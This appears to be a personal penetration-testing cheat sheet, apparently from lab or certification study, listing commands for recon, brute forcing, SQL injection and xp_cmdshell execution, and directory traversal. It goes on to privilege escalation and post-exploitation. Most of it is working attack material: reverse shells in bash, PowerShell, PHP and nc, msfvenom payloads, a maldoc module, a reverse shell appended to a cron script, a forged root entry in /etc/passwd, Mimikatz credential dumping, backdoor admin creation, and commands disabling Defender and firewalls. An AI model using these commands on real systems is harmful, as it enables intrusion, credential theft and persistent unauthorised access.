
## Recon

nmap Scan
```
Host Discovery
nmap -sn 192.168.126.X/24

OS Discovery
nmap -O 192.168.126.155

Service Version
nmap -sV 192.168.126.155

Full Port Scan with Service
sudo nmap -sV -p- 192.168.125.165 --min-rate 1000

TCP and UDP Scan
sudo nmap -sU -sS 192.168.50.149

Vuln Scan
sudo nmap -sV -p 443 --script "vuln" 192.168.50.124
```

Directory Busting
```
dirbuster
```

## Initial Foothold

Add SSH Public Key
```
ssh-keygen -t rsa -b 4096 #give any password

#This created both id_rsa and id_rsa.pub in ~/.ssh directory
#Copy the content in "id_rsa.pub" and create ".ssh" directory in /home of target machine.
chmod 700 ~/.ssh
nano ~/.ssh/authorized_keys #enter the copied content here
chmod 600 ~/.ssh/authorized_keys 

#On Attacker machine
ssh username@target_ip #enter password if you gave any
```

Brute Force
```
hydra -l <user> -v -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202

Attacking Web Forms
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"

-l for 1 User
-L for User Word List
-p for 1 Password
-P for Password List

```

Remoting
```
SSH 
ssh user@192.168.126.155
ssh -i <key> user@0192.168.126.155

PSEXEC
impacket-psexec Administrator:Password@192.168.50.212 
impacket-psexec -hashes :7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212 
Use --local-auth if Local Admin

SMBCLIENT
smbclient -L //server_name
smbclient //192.168.50.212//secrets -U Administrator%Password
smbclient //192.168.50.212//secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b

RDESKTOP
rdesktop -u Administrator -p Password 192.168.50.212:3389

```

SQLi
```
Remember that if it is a keyword, use quotes (E.g 'ORDER') 

' UNION SELECT TABLE_NAME, null from information_schema.tables 
' UNION SELECT COLUMN_NAME, null frmo information_schema.COLUMNS where TABLE_NAME = 'userlist' # 
' UNION SELECT username, password frmo user # 
' UNION SELECT COLUMN_NAME, null from information_schema.COLUMNS where TABLE_NAME = 'missile_launch_code' # 
' UNION SELECT 'order', code from missile_launch_code # 

fields%5Bemail%5D=test12345@gmail.com&fields%5Bis_admin%5D=1&field%5Bpassword%29%20VALUES%20%28%27test12345%40gmail.com%27%2C%271%27%2C%27abc%27%29%23%5D 

un= %25%27+UNION+SELECT+%271%27%2Cpassword%2C%273%27+from+user3+WHERE+%271%27+%3D+%271 

Britney' OR NOT '1'='1 
SO ONLY LOG IN AS BRITNEY

RCE
';EXEC sp_configure 'show advanced options', 1; --
';RECONFIGURE; --
';EXEC sp_configure "xp_cmdshell",1; --
';RECONFIGURE; --
';EXECUTE xp_cmdshell 'ping 192.168.45.169'; --

Determine Number of Column
' ORDER BY 1-- //
' ORDER BY 2-- //
' ORDER BY 3-- //

Table and Columns
' UNION SELECT TABLE_NAME, COLUMN_NAME FROM information_schema.columns
OR 
' UNION SELECT TABLE_NAME FROM information_schema.tables
' UNION SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name = 'users'

Time Delay
'; IF (1=1) WAITFOR DELAY '0:0:10'--

Determine Password using Substring
`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`

Error based SQLi
' or 1=1 in (select @@version) -- //
' OR 1=1 in (SELECT * FROM users) -- //
' or 1=1 in (SELECT password FROM users) -- //
```

Command Injection
```
;
&
|
%0A (\n)
$()
``
```

Useful Directories (Directory Traversal)
```
curl --path-as-is -i http://192.168.200.193:800/../../../../../etc/passwd
OR
C:\Windows\System32\drivers\etc\hosts (for windows)

Linux : 

/etc/passwd
/etc/shadow
/home/<user>/.ssh/id_rsa (or id_ecdsa, you get the idea)
/.ssh/id_rsa
/.ssh/authorized_keys
/var/log/apache/access.log
/var/log/apache2/access.log
/var/www/html/wp-config.php <-- wordpress
/etc/ssh/sshd_config

Windows :
C:/Windows/System32/drivers/etc/hosts
C:/Users/.ssh/id_rsa
C:/xampp/apache/logs/access.log <-- for log poisoning
C:/inetpub/wwwroot
C:/inetpub/wwwroot/web.config
```

Maldoc Generation
```
use exploit/multi/fileformat/office_word_macro 
set FILENAME maldoc.docm 
set LHOST <Kali IP> 
set LPORT <Listener> 
set PAYLOAD windows/meterpreter/reverse_tcp
```

### Reverse Shell

Powershell
```
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535\|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" \| Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()|
```

Bash
```
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

php
```
<?php shell_exec($_REQUEST['cmd']) ?>
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

nano wordpress.php
<?php
/**
*Plugin Name: Word Press Reverse Shell
*Author: Me
*/
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.188/9999 0>&1'");
?>

```

nc
```
nc -e /bin/sh 10.0.0.1 1234
```

exe
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
```

dll
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.193 LPORT=4444 -f dll > shell64.dll
```

MSI msfvenom reverse shell (**AlwaysInstallElevated priv esc**)
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.185 LPORT=4444 -f msi > shell.msi

msiexec /quiet /qn /i shell.msi (CMD on victim machine)
```

Interactive Shell
```
python -c 'import pty;pty.spawn("/bin/bash")'
```



## Privilege Escalation


### Windows

Windows Scheduled Tasks
```
List Scheduled Tasks
schtasks /query /fo LIST /v

Specific Task
schtasks /query /fo LIST /v /TN <task name>

Non Microsoft Tasks
Get-ScheduledTask | where {$_.TaskPath -notLike "\Microsoft*"} | ft TaskName,TaskPath,State
```

See Windows Powershell History
```
(Get-PSReadlineOption).HistorySavePath
Get-History
```

Enumerate Process
```
See Running Process
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

Get Process
Get-Process | ForEach-Object {$_.Path}
```

Enumerate Services
```
See Running Services
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

See All Services
sc query state=all

Enumerate Non Standard Services
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.PathName -notlike "C:\Windows\system32*"}

Enumerate Service Information
sc qc <Service>
sc sdshow <Service>

Create/Modify Service
sc.exe create SERVICENAME binpath= "PATH TO SERVICE"

Start/Stop Service
sc start <Service>
sc stop <Service>
```

Enumerate File Extensions
```
Linux:
find / -type f -name *.php 2> /dev/null

Windows:
Get-ChildItem -Path C:\ -Include *.kdbx,*.txt -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\steve\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users -Include *.ini -File -Recurse -ErrorAction SilentlyContinue

Search User For Everything
Get-ChildItem -Path C:\Users\ -Include *.* -File -Recurse -ErrorAction SilentlyContinue
OR
Get-ChildItem -Path C:\Users\ -Include *.txt, *.ini, *.pdf,*.xls,*.xlsx,*.doc,*.docx, *.log -File -Recurse -ErrorAction SilentlyContinue

Note : Do not search the entire C directory.
```

Enumerate Users
```
whoami
whoami /groups
net user 
net user <username>
net localgroup

whoami /priv
privileges to look out for : SeImpersonatePrivilege, SeImpersonate, SeBackupPrivilege, SeAssignPrimaryToken, SeLoadDriver, and SeDebug
```

Secrets Dump (Can be used with SeBackup)
```
samdump2 -o hashes.txt <system file> <sam file>
impacket-secretsdump john:password123@10.10.10.1
impacket-secretsdump -ntds ntds.dit -system system LOCAL
impacket-secretsdump -sam sam.bak -security security.bak -system system.bak LOCAL
```

Enumerate Machine
```
systeminfo
```

Enumerate Applications Installed
```
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname (32 bit)

Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname (64 bit)
```

Enumerate Network Interface
```
ipconfig /all
netstat -ano
```


### Linux

Enumerate Users
```
See Sudo Ability
sudo -l
sudo -i

id
cat /etc/passwd
hostname

See Environment
env

See what commands user can run
compgen -c

See What Application we can run
echo $PATH

history

Find SUID Marked Binaries
find / -perm -u=s -type f 2>/dev/null

Enumerate for Binaries with Capabilities
/usr/sbin/getcap -r / 2>/dev/null
# Look out for output with setuid inside +EP
```

Enumerate Machine
```
cat /etc/os-release

Kernel Version
uname -a

Kernel Modules 
lsmod
Kernel Modules Info
/sbin/modinfo libata
```

Enumerate Services/Processes
```
ps aux

OR

watch -n 1 "ps -aux | grep <keyword>"
```

Enumerate Network
```
ip a
netstat -anp
routel

Firewall
cat /etc/iptables/rules.v4
```

Enumerate Applications
```
dpkg -l
```

Enumerate Cronjobs
```
ls -lah /etc/cron*

User Scheduled Task
crontab -l

List Running/Ran Cronjobs
grep "CRON" /var/log/syslog

Check Permission
ls -lah /home/joe/.scripts/user_backups.sh

Append Reverse Shell to Shell Script
echo >> user_backups.sh    # add a new line to the file

echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.118.2 1234 >/tmp/f" >> user_backups.sh  # if netcat is present. else, just use the other bash one-liner below

bash -c "bash -i >& /dev/tcp/192.168.45.x/4444 0>&1"      
```

Enumerate Files
```
Identify directories that are writable (Use f for files)
find / -writable -type d 2>/dev/null

If /etc/passwd is writable
Generate Password Hash
openssl passwd <password>
Create New Root
echo "root2:<hash>:0:0:root:/root:/bin/bash" >> /etc/passwd
Change to Root
su root2

List Mounted File Systems
cat /etc/fstab

View all available disks
lsblk
```


## Post Exploit

Mimikatz
```
token::elevate
privilege::debug
sekurlsa::logonpasswords
lsadump::secrets
lsadump::cache
lsadump::sam
vault::cred
```

File Transfer
```
iwr -uri http://192.168.118.2/winPEASx64.exe -O winPEAS.exe
scp <filename> john@192.168.x.x:
certutil.exe -urlcache -f http://192.168.45.229/shell.exe C:\Users\<user>\Desktop\shell.exe
curl http://192.168.118.2/winPEASx64.exe -o winPEAS.exe


#Attacker
nc <target_ip> 1234 < nmap
#Target
nc -lvp 1234 > nmap
```

Enable RDP and Create Admin
```
Enable RDP (Powershell)
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0

Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

Enable RDP (CMD)
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

Create Admin
net user eviladmin password! /add
net localgroup Administrators eviladmin /add
net localgroup "Remote Desktop Users" eviladmin /add

# if running on a shell and adding "Remote Desktop Users" is causing a problem :
net localgroup ""Remote Desktop Users"" eviladmin /add
# escape the quotes
```

Git
```
Display status of working git directory
git status

View commit history
git log

Show different commits
git show <commit hash>

Download git folder
wget -mirror -I .git http://192.168.217.144/.git/
```

Cracking Hash
```
?l = lowercase letter 
?u = uppercase letter 
?d = digit 
?s = special character including space Custom Char Set 
?1 for variables 
E.g -1 "!@#$" then ?1?d

!@#$%??, ?u?l?l?l?l?1 
Need to define the Custom Charset 1 with comma. 
Can add more custom charset with commas
```

Ping Sweep
```
for /L %i in (1,1,254) do @ping -n 1 -w 100 192.168.1.%i | findstr "Reply"
```

Port Forwarding
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.20.30.40 LPORT=4445 -f exe > MM2.exe 
Whatever goes to Port 4445 on compromised host goes to 5555 on my host 
portfwd add -L 192.168.126.147 -R -l 5555 -p 4445 

You can use lput in proxychains impacket to put a file it goes to C:\Window 

Reverse Port Forwarding
Linux (VM2) 
ssh -R 192.168.126.151:8080:localhost:80 user@192.168.126.151 
ssh -R 192.168.126.151:2222:localhost:22 user@192.168.126.151 
Windows (VM2) 
plink -R 8080:localhost:80 user@192.168.126.151

Normal Port Forwarding
Meterpreter > portfwd add -l 17721 -p 22 -r 169.254.158.109 
portfwd 
Kali > ssh user@127.0.0.1 -p 17721

On Tunnel Server (Windows) VM1 
netsh interface portproxy add v4tov4 listenaddress=<local_IP> listenport=<local_port> connectaddress=<remote_IP> connectport=<remote_port> 
netsh interface portproxy add v4tov4 listenaddress=192.168.126.151 listenport=8080 connectaddress=10.20.30.45 connectport=80 

Check
netsh interface portproxy show v4tov4
Delete
netsh interface portproxy delete v4tov4 listenport=1337

plink -L 192.168.126.151:8080:10.20.30.45:80 user@10.20.30.45 

Might need to Disable Firewall
netsh advfirewall firewall add rule name="Proxy" dir=in action=allow protocol=TCP localport=5555


On Tunnel Server (Linux) VM1 
ssh -L <VM1 IP>:<VM1 Port>:<VM2 IP>:<VM2 Port> user@<VM2 IP> -N 
ssh -L 192.168.126.151:8080:10.20.30.45:80 user@10.20.30.45 -N 

sudo iptables -t nat -A PREROUTING -p tcp --dport <external_port> -j DNAT --to-destination <internal_ip>:<internal_port> 
sudo iptables -t nat -A PREROUTING -d 192.168.126.150 -p tcp --dport 80 -j DNAT --to-destination 10.20.30.41:80 

sudo sysctl -w net.ipv4.ip_forward=1 (Activate) https://gist.github.com/gilangvperdana/8fdcfd7136d73875ee839ab8fb9f3df1 

Reverse Shell VM 1 
ssh -L <VM1 Port for Listening>:<Kali IP>:<Kali Port> user@<Kali IP>-N
 --------------------------------------------------------------------
Proxychains
sudo nano /etc/proxychains4.conf 
Dynamic Port Forwarding
ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215

SSH Remote Port Forwarding (if inbound connection is blocked by a firewall)
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4 (victim machine)
# Configure remote port forwarding to listen on port 2345 on kali.
# kali < rev-shelled machine > machine 2
SSH Remote Dynamic Port Forwarding
ssh -N -R 9998 kali@192.168.118.4 (victim machine)
# same as regular remote port forwarding, except you only specify one socket (e.g port 9998, listening on 127.0.0.1 by default)
```

Disable Windows Defender
```
Set-MpPreference -DisableRealtimeMonitoring $true
```

Firewall Rules
```
netsh advfirewall set allprofiles state off
New-NetFirewallRule -DisplayName "Allow All Ports and IPs" -Direction Inbound -Action Allow -Protocol Any -Profile Any -Enabled True
```
